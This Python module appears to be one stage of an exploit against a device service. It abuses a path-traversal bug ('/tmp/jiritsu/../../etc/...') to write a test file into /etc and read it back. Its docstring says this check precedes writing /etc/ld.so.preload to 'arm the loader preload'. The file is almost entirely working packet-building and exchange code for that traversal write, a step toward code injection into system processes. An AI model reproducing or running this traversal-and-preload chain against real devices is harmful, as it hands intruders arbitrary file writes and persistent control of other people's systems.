"""Traversal write check: prove the service can write outside the Work area.

The read side already resolves `/tmp/jiritsu/../../<abs>` to an absolute path.
The write side uses the same resolver, but until now only Work-area and SD-card
targets had been exercised. Arming the loader preload needs a write to
`/etc/ld.so.preload`, so this module verifies the traversal write first with a
harmless file and an immediate read-back.

The target path is fixed; no caller-supplied path is accepted.
"""
import hashlib
import struct

from jiritsu_version_read import AUTHORIZED_MAX_BYTES, authorize, exchange

TARGET_PATH = "/etc/a7c2-write-check.bin"
WIRE_PATH = "/tmp/jiritsu/../../etc/a7c2-write-check.bin"
WRITE_SIZE = 256


def _select():
    return struct.pack("<HH", 0x1001, 0x0f) + b"\0" + WIRE_PATH.encode("ascii") + b"\0"


def _write(payload):
    if not isinstance(payload, bytes) or len(payload) != WRITE_SIZE:
        raise ValueError(f"payload must be exactly {WRITE_SIZE} bytes")
    return struct.pack("<HH", 0x1001, 0x10) + bytes([0x00, 0xFF, 0x00]) + payload


def _read():
    return struct.pack("<HH", 0x1001, 0x11) + bytes([0x00, 0xFF, 0x00])


def build_requests(payload):
    return {"select": _select(), "write": _write(payload), "read": _read()}


def run_traversal_write_check(transport, payload, log):
    requests = build_requests(payload)
    authorize(transport, tuple(requests.values()), max_bytes=AUTHORIZED_MAX_BYTES,
              max_requests=len(requests))
    exchange(transport, requests["select"], 4, log)
    exchange(transport, requests["write"], 4, log)
    digest = hashlib.sha256(payload).hexdigest()
    log("traversal_write_done", wire_path=WIRE_PATH, bytes=len(payload), sha256=digest)
    exchange(transport, requests["select"], 4, log)
    observed = exchange(transport, requests["read"], 4 + WRITE_SIZE, log)
    record = {
        "wire_path": WIRE_PATH,
        "resolved_path": TARGET_PATH,
        "written_bytes": len(payload),
        "written_sha256": digest,
        "readback_bytes": len(observed),
        "readback_sha256": hashlib.sha256(observed).hexdigest(),
        "matches": observed == payload,
        "preload_untouched": True,
    }
    log("traversal_write_result", **record)
    if not record["matches"]:
        raise ValueError(
            f"traversal write mismatch: wrote {len(payload)} bytes, read {len(observed)}"
        )
    return record
